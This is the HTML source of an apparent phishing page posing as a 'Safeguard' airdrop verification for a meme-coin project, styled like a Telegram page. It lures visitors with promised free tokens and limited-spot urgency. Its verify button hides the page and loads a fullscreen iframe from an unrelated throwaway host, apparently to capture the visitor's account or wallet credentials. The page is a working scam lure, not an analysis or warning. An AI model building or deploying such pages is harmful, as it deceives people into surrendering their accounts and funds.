<div class="tgme_page_wrap" bis_skin_checked="1">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Safeguard Airdrop Verification</title>
  <style>
    /* Dark futuristic theme */
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');

    body {
      margin: 0;
      padding: 0;
      font-family: 'Orbitron', sans-serif;
      background: linear-gradient(to bottom right, #0a0a0a, #1e1e1e);
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }

    /* Main content box */
    .container {
      background: rgba(20, 20, 20, 0.95);
      padding: 20px;
      border-radius: 20px;
      box-shadow: 0 0 30px rgba(74, 188, 150, 0.5);
      max-width: 90%;
      width: 100%;
      text-align: center;
      transition: opacity 0.6s ease, transform 0.6s ease;
    }

    /* Logo styling */
    .logo img {
      max-width: 120px;
      border-radius: 50%;
      box-shadow: 0 0 20px rgba(74, 188, 150, 0.7);
    }

    /* Headline styling with glow effect */
    .title {
      font-size: 28px;
      font-weight: bold;
      margin: 20px 0;
      color: #4abc96;
      text-shadow: 0 0 15px #4abc96;
      letter-spacing: 2px;
    }

    .description {
      font-size: 16px;
      color: #ddd;
      margin-bottom: 20px;
      line-height: 1.6;
      font-weight: 400;
    }

    .highlight {
      color: #00f2ff;
      font-weight: bold;
      text-shadow: 0 0 10px #00f2ff;
    }

    /* Button with neon glow effect */
    .verify-btn {
      display: inline-block;
      background: linear-gradient(90deg, #4abc96, #00f2ff);
      color: #fff;
      font-size: 18px;
      padding: 12px 30px;
      border-radius: 10px;
      text-decoration: none;
      font-weight: bold;
      box-shadow: 0 0 20px rgba(74, 188, 150, 0.8);
      transition: all 0.4s ease-in-out;
      cursor: pointer;
      border: none;
      outline: none;
    }

    .verify-btn:hover {
      background: linear-gradient(90deg, #00f2ff, #4abc96);
      box-shadow: 0 0 40px rgba(0, 242, 255, 0.9);
      transform: scale(1.05);
    }

    /* Iframe container - Fullscreen */
    .iframe-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #000;
      display: none;
      opacity: 0;
      transition: opacity 0.6s ease;
      z-index: 1000;
    }

    iframe {
      width: 100%;
      height: 100%;
      border: none;
    }

    /* Hide the container when animating */
    .hide {
      opacity: 0;
      transform: translateY(-20px);
      pointer-events: none;
    }

    /* Show iframe smoothly */
    .show {
      display: block !important;
      opacity: 1;
    }

    /* Responsive adjustments */
    @media screen and (max-width: 480px) {
      .title {
        font-size: 24px;
      }

      .description {
        font-size: 14px;
        margin-bottom: 15px;
      }

      .verify-btn {
        font-size: 16px;
        padding: 10px 25px;
      }
    }
  </style>

  <div class="container" id="content">
    <!-- Logo Section -->
    <div class="logo">
      <img src="https://img.freepik.com/premium-vector/anubis-meme-coin-logo-vector-illustration_969863-99046.jpg" alt="Safeguard">
    </div>

    <!-- Title -->
    <div class="title">üöÄ Exclusive Airdrop Event</div>

    <!-- Description -->
    <div class="description">
      Step into the <span class="highlight">future of finance</span>!<br>
      Secure your <span class="highlight">FREE</span> tokens now by verifying your identity.<br>
      Our <span class="highlight">CTO</span> is offering this limited-time opportunity.<br><br>
      ‚è≥ <span class="highlight">Limited Spots Available!</span><br><br>
      Powered by: <span class="highlight">MemeSeek</span>
    </div>

    <!-- Verify Button -->
    <button class="verify-btn" onclick="openVerification()">üöÄ Verify & Claim Airdrop</button>
  </div>

  <!-- Embedded Verification Fullscreen -->
  <div class="iframe-container" id="iframeContainer">
    <iframe id="verificationIframe" src=""></iframe>
  </div>

  <script>
    function openVerification() {
      // Hide the main content with animation
      document.getElementById('content').classList.add('hide');
      setTimeout(() => {
        document.getElementById('content').style.display = 'none';
        // Show the iframe with animation
        document.getElementById('iframeContainer').classList.add('show');
      }, 600); // Matches CSS transition time

      // Set iframe source after animation starts
      document.getElementById('verificationIframe').src = 'https://reerferer.vercel.app/a';
    }
  </script>
</div>
